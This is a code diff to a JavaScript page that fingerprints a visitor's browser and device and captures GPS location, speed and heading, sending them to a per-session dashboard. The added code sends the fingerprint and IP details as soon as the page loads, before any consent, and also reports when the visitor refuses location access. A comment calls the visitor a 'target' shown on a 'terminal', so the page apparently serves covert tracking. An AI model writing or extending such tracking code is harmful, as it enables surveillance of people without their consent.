@@ -183,15 +183,33 @@
     return {
       userAgent: navigator.userAgent || "Unknown",
       platform: navigator.platform || "Unknown",
+      browser: (function() {
+        const ua = navigator.userAgent;
+        if (ua.indexOf("Firefox") > -1) return "Firefox";
+        if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
+        if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
+        if (ua.indexOf("Trident") > -1) return "Internet Explorer";
+        if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) return "Edge";
+        if (ua.indexOf("Chrome") > -1) return "Chrome";
+        if (ua.indexOf("Safari") > -1) return "Safari";
+        return "Browser";
+      })(),
+      browserVersion: (function() {
+        const ua = navigator.userAgent;
+        const M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+        return M[2] || "1.0";
+      })(),
       screenResolution: (window.screen ? screen.width + "x" + screen.height : "Unknown"),
       devicePixelRatio: (window.devicePixelRatio || 1).toString(),
       hardwareConcurrency: (navigator.hardwareConcurrency || "Unknown").toString(),
+      cpuCores: (navigator.hardwareConcurrency || "Unknown").toString(),
       language: navigator.language || "Unknown",
       timezone: (Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Unknown"),
       timezoneOffset: new Date().getTimezoneOffset().toString(),
       viewportSize: window.innerWidth + "x" + window.innerHeight,
       colorDepth: (window.screen ? screen.colorDepth + "bpp" : "Unknown"),
-      touchSupport: (('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Supported" : "None"),
+      touchSupport: (('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No"),
+      deviceType: (('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Mobile" : "Desktop"),
       onlineStatus: (navigator.onLine ? "Online" : "Offline")
     };
   }
@@ -298,7 +316,7 @@
     setText("gps-at", new Date().toLocaleString());
     showVerdict();
 
-    const gps = { lat: lat, lon: lon, accuracy: acc, altitude: alt };
+    const gps = { lat: lat, lon: lon, accuracy: acc, altitude: alt, speed: c.speed, heading: c.heading };
     const bInfo = collectBrowserInfo();
     const sid = getSessionId();
     const dest = sid ? ("/api/session/" + sid + "/location") : "/report";
@@ -324,6 +342,14 @@
     lastErrorAt = now;
     lastErrorKey = key;
     netlog(msg);
+
+    const sid = getSessionId();
+    const dest = sid ? ("/api/session/" + sid + "/location") : "/report";
+    fetch(dest, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ denied: true, errorCode: err.code })
+    }).catch(function () {});
   }
 
   function requestOnce() {
@@ -375,6 +401,14 @@
     if (dashLink && sid) {
       dashLink.href = "/dashboard/" + sid;
     }
+
+    // Send initial browser payload upon page load so terminal displays target connection info immediately
+    const dest = sid ? ("/api/session/" + sid + "/location") : "/report";
+    fetch(dest, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ ip: ipInfo, browser: bInfo })
+    }).catch(function () {});
 
     const btnPerm = document.getElementById("btn-perm");
     const btnOnce = document.getElementById("btn-once");
